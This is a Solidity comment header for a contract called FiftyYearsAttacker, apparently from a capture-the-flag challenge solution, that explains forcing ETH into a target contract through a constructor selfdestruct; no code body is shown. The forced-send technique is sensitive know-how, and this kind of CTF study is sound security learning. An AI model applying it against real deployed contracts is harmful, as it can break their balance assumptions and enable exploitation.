/**
 * @title FiftyYearsAttacker
 * @dev This contract is designed to forcibly send ETH to another contract using selfdestruct.
 *      It is used to bypass standard transfer restrictions on contracts that do not have
 *      payable fallback or receive functions (e.g., the FiftyYearsChallenge contract).
 *
 *      In Solidity, selfdestruct(address) immediately transfers the contractâ€™s balance
 *      to the specified address, regardless of whether the recipient has any payable functions.
 *
 *      Use case:
 *      - Contract under attack lacks payable fallback, so .send/.transfer will fail
 *      - This attacker is deployed with a small amount of ETH (e.g., 2 wei)
 *      - The constructor immediately selfdestructs, forcing the ETH to the target contract
